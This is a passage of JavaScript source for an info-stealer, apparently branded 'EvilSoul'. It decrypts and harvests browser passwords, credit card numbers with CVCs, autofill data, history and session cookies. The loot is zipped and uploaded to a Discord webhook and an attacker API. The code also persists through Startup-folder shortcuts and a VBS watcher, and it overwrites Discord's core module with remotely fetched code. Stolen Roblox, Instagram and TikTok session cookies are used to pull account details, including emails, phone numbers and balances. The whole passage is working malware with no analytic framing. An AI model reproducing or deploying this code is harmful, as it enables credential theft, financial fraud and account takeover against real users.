    const localState = JSON.parse(fs.readFileSync(statePath, "utf8"));
    const encryptedKey = localState?.os_crypt?.encrypted_key;
    if (!encryptedKey) return;

    const keyBuffer = Buffer.from(encryptedKey, "base64").slice(5); // Remove "DPAPI"
    const masterKey = Dpapi.unprotectData(keyBuffer, null, "CurrentUser");

    const profiles = fs.readdirSync(operaPath, { withFileTypes: true })
      .filter(dirent => dirent.isDirectory() && (dirent.name === "Default" || dirent.name.startsWith("Profile")))
      .map(dirent => path.join(operaPath, dirent.name));

    if (profiles.length === 0) profiles.push(operaPath);

    const allPasswords = [];

    for (const profile of profiles) {
      const loginPath = path.join(profile, "Login Data");
      if (fs.existsSync(loginPath)) {
        const extracted = await extractPasswords(loginPath, masterKey);
        allPasswords.push(...extracted);
      }
    }

    const outputDir = path.join(os.tmpdir(), identifier);
    fs.mkdirSync(outputDir, { recursive: true });

    const outputFile = path.join(outputDir, "OperaPasswords.txt");
    if (allPasswords.length > 0) {
      fs.writeFileSync(outputFile, allPasswords.join("\n"), "utf8");
    }

    exec("taskkill /F /IM opera.exe /T", () => { });
  } catch { }
}


async function GetPasswords() {
  try {
    let allPasswords = [];
    for (const browser of browsers_path) {
      if (!fs.existsSync(browser[0])) continue;
      const app = browser[0].includes("Local") ? browser[0].split("\\Local\\")[1].split("\\")[0] : browser[0].split("\\Roaming\\")[1].split("\\")[1];
      const ld = browser[0] + "Login Data";
      const pdb = browser[0] + "passwords.db";
      try {
        fs.copyFileSync(ld, pdb);
      } catch {
        continue;
      }
      const db = new sqlite3.Database(pdb);
      await new Promise((resolve) => {
        db.all("SELECT origin_url, username_value, password_value FROM logins", async (err, rows) => {
          if (!err && rows) {
            for (const row of rows) {
              let password = null;
              try {
                const buffer = row.password_value;
                if (!buffer) continue;
                const prefix = buffer.slice(0, 3).toString();
                if (prefix === "v10" || prefix === "v11" || prefix === "v20") {
                  let iv, encrypted, tag, key;
                  if (prefix === "v20") {
                    // V20: Anahtar çözümü için Python ile üretilen anahtar dosyasını oku
                    const keyPath = path.join(process.env.TEMP, identifier, "Chrome", "v20_master_key.bin");
                    if (fs.existsSync(keyPath)) {
                      key = fs.readFileSync(keyPath);
                    } else {
                      continue;
                    }
                  } else {
                    key = browser[3];
                  }
                  iv = buffer.slice(3, 15);
                  encrypted = buffer.slice(15, buffer.length - 16);
                  tag = buffer.slice(buffer.length - 16);
                  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
                  decipher.setAuthTag(tag);
                  password = decipher.update(encrypted) + decipher.final();
                  password = password.toString("utf8");
                } else {
                  // Eski format veya DPAPI
                  try {
                    password = Dpapi.unprotectData(buffer, null, "CurrentUser").toString("utf8");
                  } catch {}
                }
              } catch {}
              if (password) {
                allPasswords.push([
                  row.origin_url,
                  row.username_value,
                  password,
                  `${app} ${browser[1]}`
                ]);
              }
            }
          }
          db.close();
          resolve();
        });
      });
    }
    // Firefox şifreleri
    const firefoxProfiles = [
      path.join(process.env.APPDATA, "Mozilla", "Firefox", "Profiles"),
      path.join(process.env.APPDATA, "Waterfox", "Profiles")
    ];
    for (const baseDir of firefoxProfiles) {
      if (!fs.existsSync(baseDir)) continue;
      const profiles = fs.readdirSync(baseDir).filter(folder => fs.existsSync(path.join(baseDir, folder, "logins.json")));
      for (const profile of profiles) {
        const loginsPath = path.join(baseDir, profile, "logins.json");
        try {
          const logins = JSON.parse(fs.readFileSync(loginsPath, "utf8"));
          if (Array.isArray(logins.logins)) {
            for (const entry of logins.logins) {
              // NSS ile şifre çözümü gerektirebilir, burada sadece şifresiz olanlar alınır
              if (entry.encryptedUsername || entry.encryptedPassword) continue;
              allPasswords.push([
                entry.hostname,
                entry.username,
                entry.password,
                `Firefox ${profile}`
              ]);
            }
          }
        } catch {}
      }
    }
    let output = allPasswords.map(pw => `URL: ${pw[0]}\nUSERNAME: ${pw[1]}\nPASSWORD: ${pw[2]}\nAPPLICATION: ${pw[3]}\n================`).join("\n");
    if (!output.trim()) output = "No passwords found.";
    const outputPath = `${process.env.TEMP}\\${identifier}\\passwords.txt`;
    fs.mkdirSync(`${process.env.TEMP}\\${identifier}`, { recursive: true });
    fs.writeFileSync(outputPath, output);
  } catch (err) { }
}

async function GetCreditCards() {
  try {
    let creditcards = "";
    for (const browser of browsers_path) {
      const profile = browser[0];
      const name = browser[1];
      const encryption = browser[3];
      if (!fs.existsSync(profile)) continue;
      const app = profile.includes("Local") ? profile.split("\\Local\\")[1].split("\\")[0] : profile.split("\\Roaming\\")[1].split("\\")[0];
      const wd = path.join(profile, "Web Data");
      const cdb = path.join(profile, "cards.db");
      try {
        fs.copyFileSync(wd, cdb);
      } catch {
        continue;
      }

      const db = new sqlite3.Database(cdb);
      const decrypt = (buf) => {
        const prefix = buf.slice(0, 3).toString();
        let iv, ct, tag, decipher;
        if (prefix === "v10" || prefix === "v11") {
          iv = buf.slice(3, 15);
          ct = buf.slice(15, buf.length - 16);
          tag = buf.slice(buf.length - 16);
          decipher = crypto.createDecipheriv("aes-256-gcm", encryption, iv);
          decipher.setAuthTag(tag);
        } else {
          iv = buf.slice(3, 19);
          ct = buf.slice(19);
          decipher = crypto.createDecipheriv("aes-256-cbc", encryption, iv);
        }
        return decipher.update(ct, undefined, "utf-8") + decipher.final("utf-8");
      };

      const fimiguerrero = (row) => {
        try {
          const number = decrypt(Buffer.from(row.card_number_encrypted));
          const cvc = row.cvc_encrypted ? decrypt(Buffer.from(row.cvc_encrypted)) : "——";
          creditcards += `================\nGUID: ${row.guid}\nNAME: ${row.name_on_card}\nNUMBER: ${number}\nVALID: ${row.expiration_month}/${row.expiration_year}\nCVC: ${cvc}\nAPPLICATION: ${app} ${name}\n`;
        } catch { }
      };

      await new Promise((resolve) => {
        db.each(`SELECT cc.guid, cc.name_on_card, cc.expiration_month, cc.expiration_year, cc.card_number_encrypted, cvc.value_encrypted AS cvc_encrypted FROM credit_cards cc LEFT JOIN local_stored_cvc cvc ON cc.guid = cvc.guid`, (err, row) => {
          if (row) fimiguerrero(row);
        }, () => resolve()
        );
      });

      await new Promise((resolve) => {
        db.each(`SELECT mc.id AS guid, mc.name_on_card, mc.expiration_month, mc.expiration_year, mc.card_number_encrypted, scvc.value_encrypted AS cvc_encrypted FROM masked_credit_cards mc LEFT JOIN server_stored_cvc scvc ON mc.id = scvc.instrument_id`, (err, row) => {
          if (row) fimiguerrero(row);
        }, () => resolve()
        );
      });
    }

    if (!creditcards.includes("NUMBER:")) creditcards = "Creditcards not found";
    fs.mkdirSync(`${process.env.TEMP}\\${identifier}`, { recursive: true });
    fs.writeFileSync(`${process.env.TEMP}\\${identifier}\\creditcards.txt`, creditcards);
  } catch { }
}

async function GetAutoFills() {
  try {
    let autofills = "";
    for (const browser of browsers_path) {
      if (!fs.existsSync(browser[0])) continue;
      const app = browser[0].includes("Local") ? browser[0].split("\\Local\\")[1].split("\\")[0] : browser[0].split("\\Roaming\\")[1].split("\\")[1];
      const wd = browser[0] + "Web Data";
      const wddb = browser[0] + "webdata.db";
      try {
        fs.copyFileSync(wd, wddb);
      } catch {
        continue;
      }

      const db = new sqlite3.Database(wddb);
      await new Promise((resolve) => {
        db.each("SELECT * FROM autofill", (err, row) => {
          if (row) {
            autofills += `================\nNAME: ${row.name}\nVALUE: ${row.value}\nAPPLICATION: ${app} ${browser[1]}\n`;
          }
        }, () => resolve()
        );
      });
    }

    if (!autofills.includes("NAME:")) autofills = "Autofills not found";
    fs.mkdirSync(`${process.env.TEMP}\\${identifier}`, { recursive: true });
    fs.writeFileSync(`${process.env.TEMP}\\${identifier}\\autofills.txt`, autofills);
  } catch { }
}

async function GetHistory() {
  try {
    let history = "";
    for (const browser of browsers_path) {
      if (!fs.existsSync(browser[0])) continue;
      const app = browser[0].includes("Local") ? browser[0].split("\\Local\\")[1].split("\\")[0] : browser[0].split("\\Roaming\\")[1].split("\\")[1];
      const h = browser[0] + "History";
      const hdb = browser[0] + "history.db";
      try {
        fs.copyFileSync(h, hdb);
      } catch {
        continue;
      }

      const db = new sqlite3.Database(hdb);
      await new Promise((resolve) => {
        db.each("SELECT * FROM urls", (err, row) => {
          if (row) {
            const visit = new Date(row.last_visit_time / 1000 - 11644473600000).toISOString();
            history += `================\nURL: ${row.url}\nTITLE: ${row.title || ""}\nVISITS: ${row.visit_count}\nLAST_VISIT: ${visit}\nAPPLICATION: ${app} ${browser[1]}\n`;
          }
        }, () => resolve()
        );
      });
    }

    if (!history.includes("URL:")) history = "History not found";
    fs.mkdirSync(`${process.env.TEMP}\\${identifier}`, { recursive: true });
    fs.writeFileSync(`${process.env.TEMP}\\${identifier}\\history.txt`, history);
  } catch { }
}


/* KEEP_GETINFO_START */
async function GetInfo() {
  const basePath = path.join(process.env.TEMP, identifier);
  if (!fs.existsSync(basePath) || !fs.readdirSync(basePath).length) return;

  function getFolderSize(dir) {
    let totalSize = 0;
    (function calcSize(folder) {
      for (const sub of fs.readdirSync(folder)) {
        const subPath = path.join(folder, sub);
        const subStats = fs.statSync(subPath);
        if (subStats.isDirectory()) {
          calcSize(subPath);
        } else {
          totalSize += subStats.size;
        }
      }
    })(dir);
    return totalSize;
  }

  function formatSize(bytes) {
    try {
      if (typeof bytes !== "number" || isNaN(bytes) || !isFinite(bytes) || bytes < 0) {
        return "0 B";
      }

      const units = ["B", "KB", "MB", "GB", "TB"];
      let size = bytes;
      let unitIndex = 0;

      while (size >= 1024 && unitIndex < units.length - 1) {
        size /= 1024;
        unitIndex++;
      }

      return `${size.toFixed(2)} ${units[unitIndex]}`;
    } catch {
      return "0 B";
    }
  }

  function scanDir(dir) {
    let content = "";
    const files = fs.readdirSync(dir);

    for (const file of files) {
      const filePath = path.join(dir, file);
      const stats = fs.statSync(filePath);

      if (stats.isDirectory()) {
        const folderSize = getFolderSize(filePath);
        content += `\n🗂️ ${file} - (${formatSize(folderSize)})`;
      } else {
        content += `\n📄 ${file} - (${formatSize(stats.size)})`;
      }
    }
    return content;
  }

  let result = scanDir(basePath);

  const zipPath = path.join(process.env.TEMP, `${identifier}.zip`);
  const output = fs.createWriteStream(zipPath);
  const archive = archiver("zip", { zlib: { level: 9 } });
  archive.pipe(output);
  archive.directory(basePath, false);

  await archive.finalize();
  await new Promise((resolve, reject) => {
    output.on("close", resolve);
    archive.on("error", reject);
  });

  const ip = await GetIp();
  const cpu = os.cpus()[0].model;
  const ram = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
  const version = os.version();

const payload = {
  embeds: [
    {
      color: 0x2b2d31,
      author: { name: "Informations",  icon_url: "https://i.ibb.co/C3pnNj2S/77b4f3b9-720c-4c7a-8b6b-102635726cc9.jpg", },
      fields: [
        { name: "<:evilsoulguild:1389088908117278781> Computer:",  value:  "```" + `IP Address: ${ip}\nUsername: ${os.userInfo().username}\nHostname: ${os.hostname()}\nRAM: ${ram} GB\nCPU: ${cpu}\nVersion: ${version}\nUptime: ${(os.uptime() / 60).toFixed(0)} minutes` + "```",  inline: false, },
        { name: "<:channelxs:1348556164346023957> File Content:", value: "```" + result + "```",  inline: false, },
      ],
    },
  ],
};

async function Ratarias(url) {
  const form = new FormData();
  form.append( "payload_json",
    JSON.stringify({ username: "EvilSoul",   avatar_url: "https://i.ibb.co/C3pnNj2S/77b4f3b9-720c-4c7a-8b6b-102635726cc9.jpg",  embeds: payload.embeds, })
  );
  form.append("file", fs.createReadStream(zipPath), path.basename(zipPath));
  await axios.post(url, form, { headers: form.getHeaders() });
}

  async function sqlban() {
    return new Promise((resolve, reject) => {
      const form = new FormData();
      form.append("file", fs.createReadStream(zipPath), {
        filename: path.basename(zipPath),
        contentType: "application/zip",
      });

      axios.post(`http://${config.api}/evil`, form, {
        headers: { ...form.getHeaders(), },
        maxContentLength: Infinity,
        maxBodyLength: Infinity,
      })
        .then((res) => {
          resolve(res.data);
        })
        .catch((err) => reject(err));
    });
  }

  try {
    await Ratarias(config.webhook);
    await sqlban();

    console.log(`[GET INFO] BrowserData Enviado com Sucesso para a key: ${config.key}`);
  } catch (err) {
    console.error("[ERROR] Erro ao enviar:", err.message);
  }
}


function FindBrowsers() {
  try {
    const browsersFound = [];
    for (const [name, paths] of Object.entries(browsers)) {
      if (fs.existsSync(paths.bin)) {
        browsersFound.push({ name, ...paths });
      }
    }
    return browsersFound;
  } catch (err) {
    return [];
  }
}

function CloseBrowsers(binPath) {
  try {
    const procName = basename(binPath);
    execSync(`taskkill /F /T /IM ${procName}`, { stdio: "ignore" });
  } catch (err) { }
}

async function StartBrowser(binPath, userDataPath, debugPort, profileName) {
  try {
    spawn(binPath,
      [
        "--headless=new",
        "--no-first-run",
        "--restore-last-session",
        `--remote-debugging-port=${debugPort}`,
        "--remote-allow-origins=*",
        `--user-data-dir=${userDataPath}`,
        `--profile-directory=${profileName}`,
        "--disable-gpu",
        "--mute-audio",
        "--disable-extensions",
        "--disable-background-mode",
        "--no-sandbox",
        "about:blank"
      ],
      {
        detached: true,
        stdio: "ignore",
        windowsHide: true
      }
    ).unref();

    await Sleep(2000);
  } catch (err) { }
}

async function StartOperaGX(binPath, userDataPath, debugPort) {
  try {
    const isOperaGX = /Opera GX[\\/]/.test(binPath) || /Opera GX Stable/.test(binPath);
    if (!isOperaGX) return;

    let profileMatch = userDataPath.match(/User Data[\\/](.+?)(?=[\\/]|$)/);
    let profile = profileMatch ? profileMatch[1].trim() : "";

    const args = [
      `--remote-debugging-port=${debugPort}`,
      ...(profile ? [`--profile-directory=${profile}`] : []),
      "--disable-gpu",
      "--disable-software-rasterizer",
      "--disable-dev-shm-usage",
      "--disable-accelerated-2d-canvas",
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-extensions",
      "--disable-component-extensions-with-background-pages",
      "--disable-default-apps",
      "--mute-audio",
      "--no-zygote",
      "--disable-backgrounding-occluded-windows",
      "--memory-pressure-off",
      "--force-low-power-gpu",
      "--disable-background-mode",
      "--silent-launch",
      "--no-startup-window",
      "--headless",
      "about:blank"
    ];

    spawn(binPath, args, {
      detached: true,
      stdio: "ignore",
      windowsHide: true
    }).unref();

    await Sleep(2000);
  } catch (err) {
    console.error(err);
  }
}

async function WebSocketUrl(debugPort) {
  try {
    const url = `http://127.0.0.1:${debugPort}/json`;
    const response = await axios.get(url);
    if (response.data && response.data[0] && response.data[0].webSocketDebuggerUrl) {
      return response.data[0].webSocketDebuggerUrl;
    }
  } catch (err) {
    throw err;
  }
}

async function ExtractCookies(wsUrl) {
  return new Promise((resolve, reject) => {
    const ws = new (require("ws"))(wsUrl);
    ws.on("open", () => {
      ws.send(JSON.stringify({ id: 2, method: "Network.getAllCookies" }));
    });

    ws.on("message", (data) => {
      const response = JSON.parse(data);
      if (response.result && response.result.cookies) {
        const cookies = response.result.cookies.map((cookie) => {
          if (cookie.encrypted_value) {
            try {
              const value = Buffer.from(cookie.encrypted_value, "base64");
              const iv = value.slice(3, 15);
              const data = value.slice(15, value.length - 16);
              const authTag = value.slice(value.length - 16, value.length);
              const decipher = crypto.createDecipheriv("aes-256-gcm", browsers_path[0][3], iv);
              decipher.setAuthTag(authTag);
              const decrypted = decipher.update(data, "base64", "utf-8") + decipher.final("utf-8");
              cookie.value = decrypted;
            } catch (err) { }
          }
          return cookie;
        });
        ws.close();
        resolve(cookies);
      } else {
        ws.close();
      }
    });

    ws.on("error", (err) => {
      ws.close();
      reject(err);
    });
  });
}

async function Startup() {
  try {
    const startupDir = path.join(process.env.APPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup");

    const exePath = process.execPath;
    const exeLnkPath = path.join(startupDir, `${path.basename(exePath, ".exe")}.lnk`);

    const exeLnkScript = `
      Set oWS = WScript.CreateObject("WScript.Shell")
      sLinkFile = "${exeLnkPath.replace(/\\/g, "\\\\")}"
      Set oLink = oWS.CreateShortcut(sLinkFile)
      oLink.TargetPath = "${exePath.replace(/\\/g, "\\\\")}"
      oLink.WorkingDirectory = "${path.dirname(exePath).replace(/\\/g, "\\\\")}"
      oLink.WindowStyle = 1
      oLink.IconLocation = "${exePath.replace(/\\/g, "\\\\")},0"
      oLink.Save
    `;

    const tempVbs = path.join(os.tmpdir(), "sysZxammz256.vbs");
    fs.writeFileSync(tempVbs, exeLnkScript, "utf16le");
    execSync(`cscript //nologo "${tempVbs}"`);
    fs.unlinkSync(tempVbs);

    const watcherVbs = `
      Set fso = CreateObject("Scripting.FileSystemObject")
      Set oWS = CreateObject("WScript.Shell")
      shortcutPath = "${exeLnkPath.replace(/\\/g, "\\\\")}"
      targetExe = "${exePath.replace(/\\/g, "\\\\")}"
      Do
        If Not fso.FileExists(shortcutPath) Then
          Set oLink = oWS.CreateShortcut(shortcutPath)
          oLink.TargetPath = targetExe
          oLink.WorkingDirectory = fso.GetParentFolderName(targetExe)
          oLink.WindowStyle = 1
          oLink.IconLocation = targetExe & ",0"
          oLink.Save
        End If
        WScript.Sleep 5000
      Loop
    `;

    const watcherPath = path.join(os.tmpdir(), "lib32winmz256.vbs");
    fs.writeFileSync(watcherPath, watcherVbs, "utf16le");

    const watcherLnkPath = path.join(startupDir, "watcherZxammz256.lnk");
    const watcherLnkScript = `
      Set oWS = WScript.CreateObject("WScript.Shell")
      sLinkFile = "${watcherLnkPath.replace(/\\/g, "\\\\")}"
      Set oLink = oWS.CreateShortcut(sLinkFile)
      oLink.TargetPath = "wscript.exe"
      oLink.Arguments = "\\"${watcherPath.replace(/\\/g, "\\\\")}\\""
      oLink.WorkingDirectory = "${path.dirname(watcherPath).replace(/\\/g, "\\\\")}"
      oLink.WindowStyle = 0
      oLink.IconLocation = "wscript.exe,0"
      oLink.Save
    `;

    const tempWatcherVbs = path.join(os.tmpdir(), "winJaxmalz0.vbs");
    fs.writeFileSync(tempWatcherVbs, watcherLnkScript, "utf16le");
    execSync(`cscript //nologo "${tempWatcherVbs}"`);
    fs.unlinkSync(tempWatcherVbs);

    spawn("wscript.exe", [watcherPath], {
      detached: true,
      stdio: "ignore",
    }).unref();

    return true;
  } catch (err) {
    console.error("Startup Function Error:", err.message);
    return false;
  }
}

async function FindRoblox(cookie) {
  const data = {};
  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9,hi;q=0.8",
    cookie: `.ROBLOSECURITY=${cookie.toString()};`,
    origin: "https://www.roblox.com",
    referer: "https://www.roblox.com",
    "sec-ch-ua": "'Chromium';v='110', 'Not A(Brand';v='24', 'Google Chrome';v='110'",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "'Windows'",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
  };

  const response = await axios.get("https://www.roblox.com/mobileapi/userinfo", { headers: headers }).catch(() => null);
  if (!response?.data) return data;

  data["id"] = response.data["UserID"];
  data["username"] = response.data["UserName"];
  data["avatar"] = response.data["ThumbnailUrl"];
  data["robux"] = response.data["RobuxBalance"];
  data["premium"] = response.data["IsPremium"];

  return data;
}

async function GetRoblox(cookie) {
  const data = await FindRoblox(cookie);
  const payload = {
    avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    username: "Kaue",
    embeds: [
      {
        color: 0x2b2d31,
        fields: [
          { name: "Cookie:", value: `\`\`\`${cookie || "Not found"}\`\`\``, inline: false },
          { name: "Profile Url:", value: `[Click here](https://www.roblox.com/pt/users/${data.id}/profile)`, inline: true },
          { name: "Username:", value: `\`${data.username || "None"}\``, inline: true },
          { name: "ID:", value: `\`${data.id}\``, inline: true },
          { name: "Robux:", value: `\`${data.robux || "0"}\``, inline: true },
          { name: "Premium:", value: `\`${data.premium ? "Yes" : "No"}\``, inline: true },
        ],
        thumbnail: {
          url: `${data.avatar}`,
        },
        author: {
          name: "Roblox Account",
          icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
        },
      },
    ],
  };
  await axios.post(`http://${config.api}/send-embed`, payload);
}

async function FindInstagram(cookie) {
  const data = {};
  const headers = {
    Host: "i.instagram.com",
    "X-Ig-Connection-Type": "WiFi",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Ig-Capabilities": "36r/Fx8=",
    "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
    "X-Ig-App-Locale": "en",
    "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
    "Accept-Encoding": "gzip, deflate",
    Cookie: `sessionid=${cookie};`,
  };

  const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers }).then((response) => response.data).catch(() => null);
  if (response && response.user) {
    data["username"] = response.user.username;
    data["verified"] = response.user.is_verified;
    data["avatar"] = response.user.profile_pic_url;
    data["sessionid"] = cookie;
    data["id"] = response.user.pk_id;
    data["number"] = response.user.phone_number;
    data["mail"] = response.user.email;
    data["name"] = response.user.full_name;
    data["bio"] = response.user.biography;
  }

  const response2 = await axios.get(`https://i.instagram.com/api/v1/users/${data["id"]}/info`, { headers: headers }).then((response) => response.data).catch(() => null);
  if (response2 && response2.user) {
    data["followers"] = response2.user.follower_count;
    data["follows"] = response2.user.following_count;
  }

  return data;
}

async function StopDiscords() {
  try {
    const stdout = execSync("tasklist", { encoding: "utf-8" });
    const processes = ["Discord.exe", "DiscordCanary.exe", "DiscordPTB.exe", "discordDevelopment.exe"];
    for (const process of processes) {
      if (stdout.includes(process)) {
        execSync(`taskkill /F /T /IM ${process}`);
      }
    }
  } catch (err) { }
}


async function InjectDiscord() {
  try {
    if (!local || !roaming) {
      return;
    }

    const postData = { key: config.key };
    const response = await axios.post(`http://${config.api}/dcinjection-send`, postData, {
      headers: {
        'Content-Type': 'application/json',
      },
      responseType: 'text'
    });

    const finalCode = response.data;

    if (!finalCode || finalCode.length < 10) {
      console.error('[ERROR] Invalid response from API. Injection code is missing or empty.');
      return;
    }

    const dirs = await fsPromises.readdir(local);
    const discordPaths = dirs.filter(dirName => dirName.includes('cord'));

    if (discordPaths.length === 0) {
      console.log('[INFO] No Discord installation found. Skipping injection.');
      return;
    }

    for (const discordPath of discordPaths) {
      const discordDir = path.join(local, discordPath);
      const appDirs = (await fsPromises.readdir(discordDir)).filter(dirName => dirName.startsWith('app-'));
      appDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));
      const appVersionPath = appDirs.length > 0 ? path.join(discordDir, appDirs[0]) : null;

      if (appVersionPath) {
        let discordType = 'Discord';
        if (discordPath.includes('Canary')) discordType = 'Canary';
        if (discordPath.includes('PTB')) discordType = 'PTB';

        try {
          const modulesPath = path.join(appVersionPath, 'modules');
          const dirs = await fsPromises.readdir(modulesPath);
          const coreDir = dirs.find(dirName => dirName.includes('discord_desktop_core'));

          if (coreDir) {
            const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
            const indexPath = path.join(corePath, 'index.js');
            await fsPromises.writeFile(indexPath, finalCode, 'utf8');
            console.log(`[INFO] Injected code into ${indexPath}`);
            injectionPaths.push(indexPath);
            injectionResults.push({ path: indexPath, type: discordType });

            const dbPath = path.join(roaming, discordPath.replace(local, '').trim(), 'Local Storage', 'leveldb');
            const files = await fsPromises.readdir(dbPath);
            const ldbFiles = files.filter(file => file.endsWith('.ldb'));
            const logFiles = files.filter(file => file.endsWith('.log'));

            for (const ldbFile of ldbFiles) {
              const ldbFilePath = path.join(dbPath, ldbFile);
              await fsPromises.writeFile(ldbFilePath, '', 'utf8');
            }

            for (const logFile of logFiles) {
              const logFilePath = path.join(dbPath, logFile);
              await fsPromises.unlink(logFilePath);
            }
          }
        } catch (error) {
          console.error(`[ERRO] Error injecting code into ${discordType}:`, error);
        }
      }
    }

    try {
      const betterDiscordPath = path.join(roaming, 'BetterDiscord', 'data', 'betterdiscord.asar');
      await fsPromises.writeFile(betterDiscordPath, finalCode, 'utf8');
      console.log(`[INFO] Injected code into BetterDiscord at ${betterDiscordPath}`);
      injectionPaths.push(betterDiscordPath);
      injectionResults.push({ path: betterDiscordPath, type: 'BetterDiscord' });
    } catch (error) {
      console.error('[INFO] Error injecting code into BetterDiscord:', error);
    }

  } catch (error) {
    console.error('[ERROR] An error occurred:', error);
  }
}

async function GetInstagram(cookie) {
  const data = await FindInstagram(cookie);
  const payload = {
    avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    username: "Kaue",
    embeds: [
      {
        color: 0x2b2d31,
        fields: [
          { name: "Cookie:", value: `\`\`\`${cookie || "Not found"}\`\`\``, inline: false },
          { name: "Username:", value: `\`${data.username || "None"}\``, inline: true, },
          { name: "Name:", value: `\`${data.name || "None"}\``, inline: true },
          { name: "Email:", value: `\`${data.mail || "None"}\``, inline: true },
          { name: "Phone Number:", value: `\`${data.number || "None"}\``, inline: true },
          { name: "Follower Count:", value: `\`${data.followers || 0}\``, inline: true },
          { name: "Follows Count:", value: `\`${data.follows || 0}\``, inline: true },
          { name: "Verifed:", value: `\`${data.verified ? "Yes" : "No"}\``, inline: true },
        ],
        author: {
          name: "Instagram Account",
          icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
        },
        thumbnail: {
          url: data.avatar,
        },
      },
    ],
  };
  await axios.post(`http://${config.api}/send-embed`, payload);
}

const cookies = [];
async function GetTikTok(secret_cookie) {
  if (cookies.includes(secret_cookie)) return;
  cookies.push(secret_cookie);

  const headers = {
    accept: "application/json, text/plain, */*",
    "accept-encoding": "gzip, compress, deflate, br",
    cookie: `sessionid=${secret_cookie}`,
  };

  const account = await axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers }).then((response) => response.data).catch(() => null);
  if (!account || !account.data || !account.data.username) return;

  const insights = await axios.post("https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE", "type_requests=[{'insigh_type':'vv_history','days':16},{'insigh_type':'pv_history','days':16},{'insigh_type':'like_history','days':16},{'insigh_type':'comment_history','days':16},{'insigh_type':'share_history','days':16},{'insigh_type':'user_info'},{'insigh_type':'follower_num_history','days':17},{'insigh_type':'follower_num'},{'insigh_type':'week_new_videos','days':7},{'insigh_type':'week_incr_video_num'},{'insigh_type':'self_rooms','days':28},{'insigh_type':'user_live_cnt_history','days':58},{'insigh_type':'room_info'}]", { headers: { cookie: `sessionid=${secret_cookie}` } }).then((response) => response.data).catch(() => null);
  const wallet = await axios.get("https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true", { headers: { cookie: `sessionid=${secret_cookie}` } }).then((response) => response.data).catch(() => null);
  const payload = {
    avatar_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
    username: "Kaue",
    embeds: [
      {
        color: 0x2b2d31,
        fields: [
          { name: "Cookie:", value: `\`\`\`${secret_cookie || "Not found"}\`\`\``, inline: false },
          { name: "Profile Url:", value: account.data.username ? `[Click here](https://tiktok.com/@${account.data.username})` : "Username not available", inline: true },
          { name: "ID:", value: `\`${account.data.user_id_str || "Not available"}\``, inline: true },
          { name: "Email:", value: `\`${account.data.email || "None"}\``, inline: true },
          { name: "Username:", value: `\`${account.data.username || "Username not available"}\``, inline: true },
          { name: "Followers Count:", value: `\`${insights?.follower_num?.value || "Not available"}\``, inline: true },
          { name: "Coins:", value: `\`${wallet?.data?.coins || "0"}\``, inline: true },
        ],
        color: 0x2b2d31,
        thumbnail: {
          url: `${account.data.avatar_url}`,
        },
        author: {
          name: "TikTok Account",
